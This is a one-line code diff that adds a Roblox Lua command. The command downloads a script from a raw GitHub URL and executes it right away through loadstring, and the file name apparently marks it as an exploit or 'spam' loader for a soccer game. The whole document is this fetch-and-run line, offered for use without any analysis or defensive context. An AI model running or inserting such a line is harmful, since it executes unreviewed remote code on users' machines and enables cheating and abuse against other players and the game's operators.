@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/update-illegal-soccer-spam3-jg21s3igih2lju.lua"))()
